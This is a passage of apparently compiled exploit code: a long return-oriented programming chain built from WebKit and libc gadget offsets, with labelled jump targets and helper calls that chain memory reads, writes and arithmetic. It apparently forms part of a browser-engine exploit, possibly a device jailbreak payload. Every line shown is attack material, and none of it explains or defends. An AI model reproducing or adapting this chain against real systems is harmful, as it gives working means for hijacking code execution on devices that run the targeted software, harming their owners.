webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+109128, //L1135
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1134:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1135:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+109272, //L1139
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+109240, //L1137
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+109256, //L1138
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1137:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1138:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1139:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+109344, //L1141
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1141:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+109400, //L1142
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1142:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+109480, //L1144
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1144:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1145:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1146:
db([22, 0]); // 0x16
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+109584, //L1147
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+109600, //L1148
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1147:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1148:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+109688, //L1150
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1150:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+109744, //L1151
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1151:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+109816, //L1154
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1154:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+109872, //L1156
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1156:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1157:
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+110024, //L1159
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1158:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1159:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+110112, //L1161
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+110128, //L1162
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1161:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1162:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+110272, //L1166
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+110240, //L1164
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+110256, //L1165
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1164:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1165:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1166:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+110344, //L1168
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1168:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+110400, //L1169
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1169:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+110480, //L1171
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1171:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1172:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1173:
db([23, 0]); // 0x17
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+110584, //L1174
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+110600, //L1175
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1174:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1175:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+110688, //L1177
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1177:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+110744, //L1178
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1178:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+110816, //L1181
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1181:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+110872, //L1183
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1183:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1184:
libc_base+206806, //pop rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+111024, //L1186
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1185:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1186:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+111112, //L1188
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+111128, //L1189
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1188:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1189:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+111272, //L1193
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+111240, //L1191
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+111256, //L1192
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1191:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1192:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1193:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+111344, //L1195
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1195:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+111400, //L1196
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1196:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+111480, //L1198
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1198:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1199:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1200:
db([24, 0]); // 0x18
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+111584, //L1201
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+111600, //L1202
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1201:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1202:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+111688, //L1204
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1204:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+111744, //L1205
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1205:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+111816, //L1208
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1208:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+111872, //L1210
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1210:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+111976, //L1212
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1211:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L1212:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+112064, //L1214
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+112080, //L1215
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1214:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1215:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+112224, //L1219
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+112192, //L1217
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+112208, //L1218
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1217:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1218:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1219:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+112296, //L1221
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1221:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+112352, //L1222
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1222:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+112432, //L1224
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1224:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1225:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1226:
db([4, 0]); // 0x4
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+112536, //L1227
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+112552, //L1228
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1227:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1228:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+112640, //L1230
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1230:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+112696, //L1231
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1231:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+112816, //L1234
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1233:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1234:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+112904, //L1236
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+112920, //L1237
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1236:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1237:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+113064, //L1241
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+113032, //L1239
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+113048, //L1240
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1239:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1240:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1241:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+113136, //L1243
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1243:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+113192, //L1244
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1244:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+113272, //L1246
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1246:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1247:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1248:
db([25, 0]); // 0x19
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+113376, //L1249
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+113392, //L1250
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1249:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1250:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+113480, //L1252
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1252:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+113536, //L1253
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1253:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+113608, //L1256
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1256:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+113664, //L1258
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1258:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1259:
webkit_base+8975893, //mov [rdi + 0x10], r8
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+113816, //L1261
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1260:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1261:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+113904, //L1263
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+113920, //L1264
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1263:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1264:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+114064, //L1268
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+114032, //L1266
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+114048, //L1267
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1266:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1267:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1268:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+114136, //L1270
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1270:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+114192, //L1271
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1271:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+114272, //L1273
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1273:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1274:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1275:
db([26, 0]); // 0x1a
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+114376, //L1276
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+114392, //L1277
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1276:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+114480, //L1279
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1279:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+114536, //L1280
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1280:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+114608, //L1283
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1283:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+114664, //L1285
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1285:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1286:
libc_base+206806, //pop rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+114816, //L1288
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1287:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1288:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+114904, //L1290
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+114920, //L1291
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1290:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1291:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+115064, //L1295
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+115032, //L1293
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+115048, //L1294
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1293:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1294:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1295:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+115136, //L1297
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1297:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+115192, //L1298
